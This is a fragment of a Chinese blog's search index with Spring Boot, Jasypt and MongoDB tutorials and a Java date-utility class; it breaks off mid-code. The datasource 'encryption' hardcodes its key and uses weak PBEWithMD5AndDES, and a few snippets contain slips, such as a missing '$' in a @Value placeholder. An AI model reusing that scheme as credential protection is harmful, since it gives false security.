&#125; /** * 解密 * @param ciphertext 加密后的字符串 * @return */ public static String decrypt(String ciphertext) &#123; StandardPBEStringEncryptor encryptor = new StandardPBEStringEncryptor(); EnvironmentStringPBEConfig config = new EnvironmentStringPBEConfig(); config.setAlgorithm(&quot;PBEWithMD5AndDES&quot;); config.setPassword(&quot;rstyro&quot;); encryptor.setConfig(config); //解密 String plaintext = encryptor.decrypt(ciphertext); // 解密 return plaintext; &#125;&#125; 三、把加密后的字符串放在配置文件中application.properties中的部分 配置123456789101112131415161718192021222324252627spring.datasource.driverClassName = com.mysql.jdbc.Driverspring.datasource.url = jdbc:mysql://localhost:3306/demo?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false# 下面就是加密后的密码，# spring.datasource.username = root# spring.datasource.password = lrshuai.topspring.datasource.username = CdqQH9BDIQnKMdMjF+1bZg==spring.datasource.password = 14tCBS6t6VuhVED5rGuoifNdEddlN6be# druid pool configspring.datasource.type = com.alibaba.druid.pool.DruidDataSource#druid config spring.datasource.initialSize=5 spring.datasource.minIdle=5 spring.datasource.maxActive=20 spring.datasource.maxWait=60000 spring.datasource.timeBetweenEvictionRunsMillis=60000 spring.datasource.minEvictableIdleTimeMillis=300000 spring.datasource.validationQuery=SELECT 1 FROM DUAL spring.datasource.testWhileIdle=true spring.datasource.testOnBorrow=false spring.datasource.testOnReturn=false spring.datasource.poolPreparedStatements=true spring.datasource.maxPoolPreparedStatementPerConnectionSize=20 spring.datasource.filters=stat,wall,log4j spring.datasource.connectionProperties=druid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000 四、修改配置阿里连接池的配置文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394@ConfigurationProperties(prefix = &quot;spring.druid.datasource&quot;)@Configurationpublic class DruidDBConfig &#123; private Logger logger = Logger.getLogger(this.getClass()); @Value(&quot;$&#123;spring.datasource.url&#125;&quot;) private String dbUrl; @Value(&quot;$&#123;spring.datasource.username&#125;&quot;) private String username; @Value(&quot;$&#123;spring.datasource.password&#125;&quot;) private String password; @Value(&quot;$&#123;spring.datasource.driverClassName&#125;&quot;) private String driverClassName; @Value(&quot;$&#123;spring.datasource.initialSize&#125;&quot;) private int initialSize; @Value(&quot;$&#123;spring.datasource.minIdle&#125;&quot;) private int minIdle; @Value(&quot;$&#123;spring.datasource.maxActive&#125;&quot;) private int maxActive; @Value(&quot;$&#123;spring.datasource.maxWait&#125;&quot;) private long maxWait; @Value(&quot;$&#123;spring.datasource.timeBetweenEvictionRunsMillis&#125;&quot;) private int timeBetweenEvictionRunsMillis; @Value(&quot;$&#123;spring.datasource.minEvictableIdleTimeMillis&#125;&quot;) private int minEvictableIdleTimeMillis; @Value(&quot;$&#123;spring.datasource.validationQuery&#125;&quot;) private String validationQuery; @Value(&quot;$&#123;spring.datasource.testWhileIdle&#125;&quot;) private boolean testWhileIdle; @Value(&quot;$&#123;spring.datasource.testOnBorrow&#125;&quot;) private boolean testOnBorrow; @Value(&quot;$&#123;spring.datasource.testOnReturn&#125;&quot;) private boolean testOnReturn; @Value(&quot;$&#123;spring.datasource.poolPreparedStatements&#125;&quot;) private boolean poolPreparedStatements; @Value(&quot;$&#123;spring.datasource.maxPoolPreparedStatementPerConnectionSize&#125;&quot;) private int maxPoolPreparedStatementPerConnectionSize; @Value(&quot;$&#123;spring.datasource.filters&#125;&quot;) private String filters; @Value(&quot;&#123;spring.datasource.connectionProperties&#125;&quot;) private String connectionProperties; @Bean //声明其为Bean实例 @Primary //在同样的DataSource中，首先使用被标注的DataSource public DataSource dataSource()&#123; DruidDataSource datasource = new DruidDataSource(); datasource.setUrl(this.dbUrl); //就是这里了，解个密就行了 username = DBEncryptUtil.decrypt(username); password = DBEncryptUtil.decrypt(password); datasource.setUsername(username); datasource.setPassword(password); datasource.setDriverClassName(driverClassName); //configuration datasource.setInitialSize(initialSize); datasource.setMinIdle(minIdle); datasource.setMaxActive(maxActive); datasource.setMaxWait(maxWait); datasource.setTimeBetweenEvictionRunsMillis(timeBetweenEvictionRunsMillis); datasource.setMinEvictableIdleTimeMillis(minEvictableIdleTimeMillis); datasource.setValidationQuery(validationQuery); datasource.setTestWhileIdle(testWhileIdle); datasource.setTestOnBorrow(testOnBorrow); datasource.setTestOnReturn(testOnReturn); datasource.setPoolPreparedStatements(poolPreparedStatements); datasource.setMaxPoolPreparedStatementPerConnectionSize(maxPoolPreparedStatementPerConnectionSize); try &#123; datasource.setFilters(filters); &#125; catch (SQLException e) &#123; logger.error(&quot;druid configuration initialization filter&quot;, e); &#125; datasource.setConnectionProperties(connectionProperties); return datasource; &#125; &#125; 五、这样就ok了但我总感觉方法有点LOW ，如果各位大佬有更好的方式，欢迎留言，非常感谢，如果文章有写错的地方，非常欢迎指出]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Spring Boot (十一)：与MongoDB 整合]]></title>
    <url>%2Fblog%2F2017%2F10%2F30%2FSpring%20Boot%20(%E5%8D%81%E4%B8%80)%EF%BC%9A%E4%B8%8EMongoDB%20%E6%95%B4%E5%90%88%2F</url>
    <content type="text"><![CDATA[Springboot 的Mongodb 的整合一、导入依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-mongodb&lt;/artifactId&gt;&lt;/dependency&gt; 二、配置文件application.properties 添加mongo 地址12345# 这种事需要 认证的 用户名和密码#spring.data.mongodb.uri=mongodb://username:password@192.168.12.133:22222/test# 这种是不需要认证的spring.data.mongodb.uri=mongodb://192.168.12.133:22222/test 三、编写Dao层这里有两种方法1、继承自 MongoRepository&lt;T,ID&gt;这个基本的增删改查它都封装好了，直接调用即可。User1234567public class User &#123; @Id private Long id; private String name; private Integer age; //get set 方法 省略了....&#125; UserRepository.class123456789101112package top.lrshuai.mongodb.repository;import org.springframework.data.mongodb.repository.MongoRepository;import org.springframework.stereotype.Component;import top.lrshuai.mongodb.entity.User;@Componentpublic interface UserRepository extends MongoRepository&lt;User, Long&gt;&#123; public User findUserByName(String username);&#125; 2、自定义Dao使用 MongoTemplate 自己封装方法，可实现复杂的查询方法。UserDao.class1234567891011121314151617181920package top.lrshuai.mongodb.dao;import java.util.List;import top.lrshuai.mongodb.entity.User;/** * * @author rstyro * */public interface UserDao &#123; public void saveUser(User user); public void saveBathUser(List&lt;User&gt; users); public void delUserById(Long id); public int upadteUserById(User user); public User findUserByName(String name); public List&lt;User&gt; findAll(); public List&lt;User&gt; findUserByLikeName(String name); &#125; UserDaoImpl.class123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101package top.lrshuai.mongodb.dao.impl;import java.util.List;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.data.mongodb.core.MongoTemplate;import org.springframework.data.mongodb.core.query.Criteria;import org.springframework.data.mongodb.core.query.Query;import org.springframework.data.mongodb.core.query.Update;import org.springframework.stereotype.Component;import com.mongodb.WriteResult;import top.lrshuai.mongodb.dao.UserDao;import top.lrshuai.mongodb.entity.User;@Componentpublic class UserDaoImpl implements UserDao&#123; @Autowired private MongoTemplate mongoTemplate; /** * 新增一个，存在则覆盖 */ @Override public void saveUser(User user) &#123; mongoTemplate.save(user); &#125; /** * 批量新增 */ @Override public void saveBathUser(List&lt;User&gt; users) &#123; mongoTemplate.insert(users, User.class); &#125; /** * 删除 */ @Override public void delUserById(Long id) &#123; Query query = new Query(Criteria.where(&quot;id&quot;).is(id)); mongoTemplate.remove(query, User.class); &#125; /** * 更新 通过id */ @Override public int upadteUserById(User user) &#123; Query query = new Query(Criteria.where(&quot;id&quot;).is(user.getId())); Update update = new Update(); update.set(&quot;name&quot;, user.getName()).set(&quot;age&quot;, user.getAge()); WriteResult result = mongoTemplate.updateFirst(query, update, User.class); return result.getN(); &#125; /** * 通过名称查找 */ @Override public User findUserByName(String name) &#123; Query query = new Query(Criteria.where(&quot;name&quot;).is(name)); return mongoTemplate.findOne(query, User.class); &#125; /** * 查询所有 */ @Override public List&lt;User&gt; findAll() &#123; return mongoTemplate.findAll(User.class); &#125; /** * name模糊查找 */ @Override public List&lt;User&gt; findUserByLikeName(String name) &#123; Query query = new Query(); query.addCriteria(Criteria.where(&quot;name&quot;).regex(&quot;.*&quot; +name+ &quot;.*&quot;)); return mongoTemplate.find(query, User.class); &#125; /** * text 全文索引查询 * 这个首先你要创建全文索引 * 详细用法：https://spring.io/blog/2014/07/17/text-search-your-documents-with-spring-data-mongodb */ @Test public void customQueryLikeName() &#123; TextCriteria criteria = TextCriteria.forDefaultLanguage(); criteria.matching(&quot;haha&quot;,&quot;rstyro&quot;,&quot;lrshuai&quot;); Query query = TextQuery.queryText(criteria) .sortByScore(); List&lt;User&gt; users = mongoTemplate.find(query, User.class); &#125;&#125; 四、测试类完整代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125package top.lrshuai.mongodb;import java.util.ArrayList;import java.util.List;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.test.context.junit4.SpringRunner;import top.lrshuai.mongodb.dao.UserDao;import top.lrshuai.mongodb.entity.User;import top.lrshuai.mongodb.repository.UserRepository;@RunWith(SpringRunner.class)@SpringBootTestpublic class ApplicationTests &#123; @Autowired private UserDao userDao; @Autowired private UserRepository userRepository; /** * 批量新增 */ @Test public void customBathSave() &#123; List&lt;User&gt; users = new ArrayList&lt;&gt;(); User u1 = new User(1l, &quot;lrshuai&quot;, 23); User u2 = new User(2l, &quot;rstyro&quot;, 24); User u3 = new User(3l, &quot;tyro&quot;, 25); User u4 = new User(4l, &quot;mongo&quot;, 26); users.add(u1); users.add(u2); users.add(u3); users.add(u4); userDao.saveBathUser(users); &#125; /** * 保存单个，存在则修改 */ @Test public void customSave() &#123; userDao.saveUser(new User(1l, &quot;rstyro&quot;, 23)); &#125; /** * 删除 */ @Test public void customDel() &#123; userDao.delUserById(1l); &#125; /** * 更新通过ID */ @Test public void customUpdate() &#123; User user = new User(2l,&quot;修改用户名&quot;,25); System.out.println(userDao.upadteUserById(user)); &#125; /** * 通过用户名精确查找 */ @Test public void customQuery() &#123; User user = userDao.findUserByName(&quot;haha&quot;); System.out.println(&quot;user=&quot;+user); &#125; @Test public void customQueryAll() &#123; List&lt;User&gt; users = userDao.findAll(); System.out.println(&quot;users=&quot;+users); &#125; /** * 通过name 模糊查找 */ @Test public void customQueryLikeName() &#123; String name=&quot;o&quot;; List&lt;User&gt; users = userDao.findUserByLikeName(name); System.out.println(&quot;users=&quot;+users); &#125; /********** 下面是继承 MongoRepository 的方法 ******/ @Test public void saveTest()&#123; User user = userRepository.save(new User(2l, &quot;haha&quot;, 23)); System.out.println(&quot;保存后返回的 user&quot;+user); &#125; @Test public void delTest()&#123; userRepository.delete(3l); &#125; @Test public void updateTest()&#123; User user = userRepository.save(new User(4l, &quot;测试&quot;, 24)); System.out.println(&quot;修改后返回的 user&quot;+user); &#125; @Test public void findOneByNameTest()&#123; User u = userRepository.findUserByName(&quot;rstyro&quot;); System.out.println(&quot;user=&quot;+u); &#125; @Test public void findAllTest()&#123; List&lt;User&gt; users = userRepository.findAll(); System.out.println(&quot;users=&quot;+users); &#125; &#125; Github 示例代码：https://github.com/rstyro/spring-boot/tree/master/springboot-mongodb]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB (八)：副本集配置]]></title>
    <url>%2Fblog%2F2017%2F10%2F27%2FMongoDB%20(%E5%85%AB)%EF%BC%9A%E5%89%AF%E6%9C%AC%E9%9B%86%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[mongodb 副本集配置副本集概念：就我的理解就是和主从复制 差不多，就是在主从复制的基础上多加了一个选举的机制。复制集 特点：数据一致性 主是唯一的，没有Mysql 那样的双主结构 大多数原则，集群存活节点小于二分之一是集群不可写，只可读 从库无法写入数据 自动容灾 配置过程：一、安装mongodb安装过程略，不懂得可以看前面的教程二、创建存储目录与配置文件22222.conf 文件内容如下：123456dbpath=/data/mongodb1/dbdatalogpath=/data/mongodb1/logs/mongodb.logport=22222bind_ip=127.0.0.1replSet=copydb/127.0.0.1:33333fork=true 33333.conf 文件内容如下：123456dbpath=/data/mongodb2/dbdatalogpath=/data/mongodb2/logs/mongodb.logport=33333bind_ip=127.0.0.1replSet=copydb/127.0.0.1:44444fork=true 44444.conf 文件内容如下：123456dbpath=/data/mongodb3/dbdatalogpath=/data/mongodb3/logs/mongodb.logport=44444bind_ip=127.0.0.1replSet=copydb/127.0.0.1:22222fork=true 配置常用参数说明： 参数 说明 dbpath 存储路径 logpath log 生成的路径 port 端口 bing_ip 绑定的ip，所在服务器的ip replSet copydb 这个可以说是复制集的名字随意改，这个连接在复制集中形成一个闭环就可以了 auth 是否启动认证 fork true 已守护进程运行 keyFile 集群的私钥的完整路径 pidfilepath PID File 的完整路径，如果没有设置，则没有PID文件 journal 启用日志选项，MongoDB的数据操作将会写入到journal文件夹的文件里 logappend 是否追加 oplogSize 指定oplog大小，单位MB，建议设大点 三、启动123mongod -f /data/mongodb1/conf/22222.confmongod -f /data/mongodb2/conf/33333.confmongod -f /data/mongodb3/conf/44444.conf 四、初始化副本集随便连接一个，然后初始化副本集123456# 连接mongo -port 22222# 选择admin数据库use admin# 初始化副本集，_id:copydb 就是上面配置中 的replSet 的 copydb db.runCommand(&#123;&quot;replSetInitiate&quot;:&#123;_id:&quot;copydb&quot;,members:[&#123;_id:1,host:&quot;127.0.0.1:22222&quot;&#125;,&#123;_id:2,host:&quot;127.0.0.1:33333&quot;&#125;,&#123;_id:3,host:&quot;127.0.0.1:44444&quot;&#125;]&#125;&#125;) 初始化副本集的参数说明 _id 整数 id:0 host 字符串 地址 arbiterOnly 布尔值 默认为false,如果是true 只作为选举节点，不进行备份 priority 整数型 权重默认是1，取值范围0-1000 ，如果为0永远不能为主节点。 hidden 布尔值 当前从节点对程序不可见， votes 整数型 投票数 0/1 slaveDelay 整数型 默认 0， 从节点为延迟节点例如，slaveDelay=3600 延迟3600 秒，进行数据同步 buildIndexes 布尔值 默认为true, 从节点是否创建索引 可通过 rs.config() 来查看配置信息这样就算配置成功了。是不是很简单。。。可以自己测试数据，我这里就不操作了…..注意： 没有初始化副本集之前最好不要执行 插入之类的操作，节点不是PRIMARY 的，一般在shell是不能查询操作的，但可以执行rs.slaveOk() 就可以查询了。 官方的说明：db.getMongo().setSlaveOk()This allows the current connection to allow read operations to run on secondary members. See the readPref() method for more fine-grained control over read preference in the mongo shell. 五、关于副本集的工作流程oplog 是异步的，每个节点都有Oplog 的结构参数说明： 参数 说明 ts 操作发生时的时间戳 h 此操作的独一无二的ID v oplog 的版本 op 操作类型：i — insert,u — upadte d—delete，c–cmd ,n – null ns 操作所处的命名空间 db_name,coll_name o 操作对应的文档 o2 仅update 操作时有，更新操作的变更条件 oplog 的特点： 利用封顶表 capped collection 滚动覆盖写入，固定大小或固定条数（不推荐）oplog 是在local 数据库中1234567use local# 查看状态db.oplog.rs.stats()# 查询最后一条的记录db.oplog.rs.find().sort(&#123;$natural:-1&#125;).limit(1).pretty()]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB (七)：主从配置]]></title>
    <url>%2Fblog%2F2017%2F10%2F26%2FMongoDB%20(%E4%B8%83)%EF%BC%9A%E4%B8%BB%E4%BB%8E%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[mongodb 主从复制配置主从复制也是挺常见数据备份了。可以配置一主一从，或一主多从。明确一点就是只有一个主，我这里演示一主多从一、环境3台主机：（当然你在一台机器上启动多个服务端也是可以的） 主 ip： 192.168.12.132 从 ip： 192.168.12.133 从 ip： 192.168.12.134 二、配置准备工作：(a)、创建mongodb 的数据存储目录(b)、创建mongodb 的log目录(c)、创建mongodb 的配置文件目录123mkdir -p /usr/local/mongodb/datamkdir -p /usr/local/mongodb/logsmkdir -p /usr/local/mongodb/conf 上面的命令3台都要执行1、在(主)192.168.12.132 创建配置文件,vim /usr/local/mongodb/conf/22222.cnf 添加如下内容:1234567891011port=22222# mongodb 数据存储位置dbpath=/usr/local/mongodb/data# log 生成位置logpath=/usr/local/mongodb/logs/mongo.logfork=true# auth=true# 这是绑定主机ipbind_ip=192.168.12.132# master 来确定哪个是主master=true 2、在(从)192.168.12.133 创建配置文件,vim /usr/local/mongodb/conf/33333.cnf 添加如下内容:123456789port=33333fork=truedbpath=/usr/local/mongodb/datalogpath=/usr/local/mongodb/logs/33333.logbind_ip=192.168.12.133# 来指定 主 的数据来源source=192.168.12.132:22222# slave 来确定是从slave=true ###3、在(从)192.168.12.134 创建配置文件,vim /usr/local/mongodb/conf/44444.cnf 添加如下内容:123456789port=44444fork=truedbpath=/usr/local/mongodb/datalogpath=/usr/local/mongodb/logs/44444.logbind_ip=192.168.12.134# 来指定 主 的数据来源source=192.168.12.132:22222# slave 来确定是从slave=true 小结： 由master 来确定主服务器，slave 与source 来确定从服务器 三、启动我已经配置好了环境变量12345678# 在主192.168.12.132服务器上运行mongod -f /usr/local/mongodb/conf/22222.conf# 在从192.168.12.133服务器上运行mongod -f /usr/local/mongodb/conf/33333.conf# 在从192.168.12.134服务器上运行mongod -f /usr/local/mongodb/conf/33333.conf 四、连接12345# 连接主服务器mongo 192.168.12.132:22222# 测试 是否是主rs.isMaster() 在主中插入数据，从也是可以找到的。就ok了]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分享一个时间工具类]]></title>
    <url>%2Fblog%2F2017%2F10%2F25%2F%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E6%97%B6%E9%97%B4%E5%B7%A5%E5%85%B7%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[分享一个时间Java工具类 获取格式化输出 获取当天开始/结束时间 获取昨天开始/结束时间 获取明天开始/结束时间 得到N天之后的日期 获取本周的开始/结束时间 获取本月的开始/结束时间 获取本年的开始/结束时间 获取今年是哪一年 获取本月是哪一月 获取某年某月到某年某月按天的切片日期集合 获取某年某月按天切片日期集合 获取某年某月的第一天日期 获取某年某月的最后一天日期 …….. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598package top.lrshuai.blog.util;import java.sql.Timestamp;import java.text.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.ArrayList;import java.util.Calendar;import java.util.Date;import java.util.GregorianCalendar;import java.util.List;/** * * @author rstyro * */public class DateUtil &#123; private final static SimpleDateFormat sdfYear = new SimpleDateFormat(&quot;yyyy&quot;); private final static SimpleDateFormat sdfDay = new SimpleDateFormat( &quot;yyyy-MM-dd&quot;); private final static SimpleDateFormat sdfDays = new SimpleDateFormat( &quot;yyyyMMdd&quot;); private final static SimpleDateFormat sdfTime = new SimpleDateFormat( &quot;yyyy-MM-dd HH:mm:ss&quot;); /** * 获取YYYY格式 * * @return */ public static String getYear() &#123; return sdfYear.format(new Date()); &#125; /** * 获取YYYY-MM-DD格式 * * @return */ public static String getDay() &#123; return sdfDay.format(new Date()); &#125; /** * 获取YYYYMMDD格式 * * @return */ public static String getDays()&#123; return sdfDays.format(new Date()); &#125; /** * 获取YYYY-MM-DD HH:mm:ss格式 * * @return */ public static String getTime() &#123; return sdfTime.format(new Date()); &#125; /** * @Title: compareDate * @Description: TODO(日期比较，如果s&gt;=e 返回true 否则返回false) * @param s * @param e * @return boolean * @throws * @author luguosui */ public static boolean compareDate(String s, String e) &#123; if(fomatDate(s)==null||fomatDate(e)==null)&#123; return false; &#125; return fomatDate(s).getTime() &gt;=fomatDate(e).getTime(); &#125; /** * 格式化日期 * * @return */ public static Date fomatDate(String date) &#123; DateFormat fmt = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;); try &#123; return fmt.parse(date); &#125; catch (ParseException e) &#123; e.printStackTrace(); return null; &#125; &#125; /** * 格式化日期 * @param date 时间 * @param format 格式化格式 * @return */ public static String fomatDate(Date date,String format) &#123; DateFormat fmt = new SimpleDateFormat(format); try &#123; return fmt.format(date); &#125; catch (Exception e) &#123; e.printStackTrace(); return null; &#125; &#125; /** * 校验日期是否合法 * * @return */ public static boolean isValidDate(String s) &#123; DateFormat fmt = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;); try &#123; fmt.parse(s); return true; &#125; catch (Exception e) &#123; // 如果throw java.text.ParseException或者NullPointerException，就说明格式不对 return false; &#125; &#125; public static int getDiffYear(String startTime,String endTime) &#123; DateFormat fmt = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;); try &#123; int years=(int) (((fmt.parse(endTime).getTime()-fmt.parse(startTime).getTime())/ (1000 * 60 * 60 * 24))/365); return years; &#125; catch (Exception e) &#123; // 如果throw java.text.ParseException或者NullPointerException，就说明格式不对 return 0; &#125; &#125; /** * &lt;li&gt;功能描述：时间相减得到天数 * @param beginDateStr * @param endDateStr * @return * long * @author Administrator */ public static long getDaySub(String beginDateStr,String endDateStr)&#123; long day=0; java.text.SimpleDateFormat format = new java.text.SimpleDateFormat(&quot;yyyy-MM-dd&quot;); java.util.Date beginDate = null; java.util.Date endDate = null; try &#123; beginDate = format.parse(beginDateStr); endDate= format.parse(endDateStr); &#125; catch (ParseException e) &#123; e.printStackTrace(); &#125; day=(endDate.getTime()-beginDate.getTime())/(24*60*60*1000); //System.out.println(&quot;相隔的天数=&quot;+day); return day; &#125; /** * 得到n天之后的日期 * @param days * @return */ public static String getAfterDayDate(String days) &#123; int daysInt = Integer.parseInt(days); Calendar canlendar = Calendar.getInstance(); // java.util包 canlendar.add(Calendar.DATE, daysInt); // 日期减 如果不够减会将月变动 Date date = canlendar.getTime(); SimpleDateFormat sdfd = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;); String dateStr = sdfd.format(date); return dateStr; &#125; /** * 得到n天之后是周几 * @param days * @return */ public static String getAfterDayWeek(String days) &#123; int daysInt = Integer.parseInt(days); Calendar canlendar = Calendar.getInstance(); // java.util包 canlendar.add(Calendar.DATE, daysInt); // 日期减 如果不够减会将月变动 Date date = canlendar.getTime(); SimpleDateFormat sdf = new SimpleDateFormat(&quot;E&quot;); String dateStr = sdf.format(date); return dateStr; &#125; /** * 获取当天的开始时间 * @return */ public static Date getDayBegin() &#123; Calendar cal = new GregorianCalendar(); cal.set(Calendar.HOUR_OF_DAY, 0); cal.set(Calendar.MINUTE, 0); cal.set(Calendar.SECOND, 0); cal.set(Calendar.MILLISECOND, 0); return cal.getTime(); &#125; /** * 获取当天的结束时间 * @return */ public static Date getDayEnd() &#123; Calendar cal = new GregorianCalendar(); cal.set(Calendar.HOUR_OF_DAY, 23); cal.set(Calendar.MINUTE, 59); cal.set(Calendar.SECOND, 59); return cal.getTime(); &#125; /** * 获取昨天的开始时间 * @return */ public static Date getBeginDayOfYesterday() &#123; Calendar cal = new GregorianCalendar(); cal.setTime(getDayBegin()); cal.add(Calendar.DAY_OF_MONTH, -1); return cal.getTime(); &#125; /** * 获取昨天的结束时间 * @return */ public static Date getEndDayOfYesterDay() &#123; Calendar cal = new GregorianCalendar(); cal.setTime(getDayEnd()); cal.add(Calendar.DAY_OF_MONTH, -1); return cal.getTime(); &#125; /** * 获取明天的开始时间 * @return */ public static Date getBeginDayOfTomorrow() &#123; Calendar cal = new GregorianCalendar(); cal.setTime(getDayBegin()); cal.add(Calendar.DAY_OF_MONTH, 1); return cal.getTime(); &#125; /** * 获取明天的结束时间 * @return */ public static Date getEndDayOfTomorrow() &#123; Calendar cal = new GregorianCalendar(); cal.setTime(getDayEnd()); cal.add(Calendar.DAY_OF_MONTH, 1); return cal.getTime(); &#125; /** * 获取本周的开始时间 * @return */ public static Date getBeginDayOfWeek() &#123; Date date = new Date(); Calendar cal = Calendar.getInstance(); cal.setTime(date); int dayofweek = cal.get(Calendar.DAY_OF_WEEK); if (dayofweek == 1) &#123; dayofweek += 7; &#125; cal.add(Calendar.DATE, 2 - dayofweek); return getDayStartTime(cal.getTime()); &#125; /** * 获取本周的结束时间 * @return */ public static Date getEndDayOfWeek() &#123; Calendar cal = Calendar.getInstance(); cal.setTime(getBeginDayOfWeek()); cal.add(Calendar.DAY_OF_WEEK, 6); Date weekEndSta = cal.getTime(); return getDayEndTime(weekEndSta); &#125; /** * 获取本月的开始时间 * @return */ public static Date getBeginDayOfMonth() &#123; Calendar calendar = Calendar.getInstance(); calendar.set(getNowYear(), getNowMonth() - 1, 1); return getDayStartTime(calendar.getTime()); &#125; /** * 获取本月的结束时间 * @return */ public static Date getEndDayOfMonth() &#123; Calendar calendar = Calendar.getInstance(); calendar.set(getNowYear(), getNowMonth() - 1, 1); int day = calendar.getActualMaximum(5); calendar.set(getNowYear(), getNowMonth() - 1, day); return getDayEndTime(calendar.getTime()); &#125; /** * 获取本年的开始时间 * @return */ public static java.util.Date getBeginDayOfYear() &#123; Calendar cal = Calendar.getInstance(); cal.set(Calendar.YEAR, getNowYear()); // cal.set cal.set(Calendar.MONTH, Calendar.JANUARY); cal.set(Calendar.DATE, 1); return getDayStartTime(cal.getTime()); &#125; /** * 获取本年的结束时间 * @return */ public static java.util.Date getEndDayOfYear() &#123; Calendar cal = Calendar.getInstance(); cal.set(Calendar.YEAR, getNowYear()); cal.set(Calendar.MONTH, Calendar.DECEMBER); cal.set(Calendar.DATE, 31); return getDayEndTime(cal.getTime()); &#125; /** * 获取某个日期的开始时间 * @param d * @return */ public static Timestamp getDayStartTime(Date d) &#123; Calendar calendar = Calendar.getInstance(); if (null != d) calendar.setTime(d); calendar.set(calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH), calendar.get(Calendar.DAY_OF_MONTH), 0, 0, 0); calendar.set(Calendar.MILLISECOND, 0); return new Timestamp(calendar.getTimeInMillis()); &#125; /** * 获取某个日期的结束时间 * @param d * @return */ public static Timestamp getDayEndTime(Date d) &#123; Calendar calendar = Calendar.getInstance(); if (null != d) calendar.setTime(d); calendar.set(calendar.get(Calendar.YEAR), calendar.get(Calendar.MONTH), calendar.get(Calendar.DAY_OF_MONTH), 23, 59, 59); calendar.set(Calendar.MILLISECOND, 999); return new Timestamp(calendar.getTimeInMillis()); &#125; /** * 获取今年是哪一年 * @return */ public static Integer getNowYear() &#123; Date date = new Date(); GregorianCalendar gc = (GregorianCalendar) Calendar.getInstance(); gc.setTime(date); return Integer.valueOf(gc.get(1)); &#125; /** * 获取本月是哪一月 * @return */ public static int getNowMonth() &#123; Date date = new Date(); GregorianCalendar gc = (GregorianCalendar) Calendar.getInstance(); gc.setTime(date); return gc.get(2) + 1; &#125; /** * 两个日期相减得到的天数 * @param beginDate * @param endDate * @return */ public static int getDiffDays(Date beginDate, Date endDate) &#123; if (beginDate == null || endDate == null) &#123; throw new IllegalArgumentException(&quot;getDiffDays param is null!&quot;); &#125; long diff = (endDate.getTime() - beginDate.getTime()) / (1000 * 60 * 60 * 24); int days = new Long(diff).intValue(); return days; &#125; /** * 两个日期相减得到的毫秒数 * @param beginDate * @param endDate * @return */ public static long dateDiff(Date beginDate, Date endDate) &#123; long date1ms = beginDate.getTime(); long date2ms = endDate.getTime(); return date2ms - date1ms; &#125; /** * 获取两个日期中的最大日期 * @param beginDate * @param endDate * @return */ public static Date max(Date beginDate, Date endDate) &#123; if (beginDate == null) &#123; return endDate; &#125; if (endDate == null) &#123; return beginDate; &#125; if (beginDate.after(endDate)) &#123; return beginDate; &#125; return endDate; &#125; /** * 获取两个日期中的最小日期 * @param beginDate * @param endDate * @return */ public static Date min(Date beginDate, Date endDate) &#123; if (beginDate == null) &#123; return endDate; &#125; if (endDate == null) &#123; return beginDate; &#125; if (beginDate.after(endDate)) &#123; return endDate; &#125; return beginDate; &#125; /** * 返回某月该季度的第一个月 * @param date * @return */ public static Date getFirstSeasonDate(Date date) &#123; final int[] SEASON = &#123; 1, 1, 1, 2, 2, 2, 3, 3, 3, 4, 4, 4 &#125;; Calendar cal = Calendar.getInstance(); cal.setTime(date); int sean = SEASON[cal.get(Calendar.MONTH)]; cal.set(Calendar.MONTH, sean * 3 - 3); return cal.getTime(); &#125; /** * 返回某个日期下几天的日期 * @param date * @param i * @return */ public static Date 